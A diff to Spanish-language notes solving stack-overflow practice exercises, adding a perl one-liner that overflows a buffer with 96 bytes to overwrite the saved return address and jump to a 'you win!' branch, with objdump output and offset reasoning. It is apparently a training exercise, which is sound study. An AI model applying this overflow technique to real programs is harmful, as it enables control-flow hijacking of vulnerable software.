@@ -32,7 +32,28 @@ Hexa	01 02 00 05
 echo -ne '00000000000000000000000000000000000000000000000000000000000000000000000000000000\x05\x00\x02\x01' | ./a.out
 
 Stack 4
-Hexa 	00 0d 0a 00
+perl -e 'print "a"x96 . "\x40\x0c\x40\x00"' | ./a.out
+
+Compilarlo como a los otros.
+objdump -d ./a.out
+	00400ba0 <stack4>:
+	...
+	400c3c bne = Si la cookie no es igual al número dado hacer el branch. Sino imprimir "you win!"
+	400c40 -->NOP después de de la comparación con el número.
+	Entonces si salto a 400c40 (00 40 0c 40) ejecuto el caso exitoso.
+Nota 1: En perl es más comodo para imprimir las repeticiones de llenado.
+Nota 2: Se imprimen 96 caracteres para llegar hasta el $ra de la función stack4.
+	80 para llenar el buffer
+	16 para pisar gp y fp y quedar en el $ra
+
+
+
+
+
+
+
+
+
 
 
 
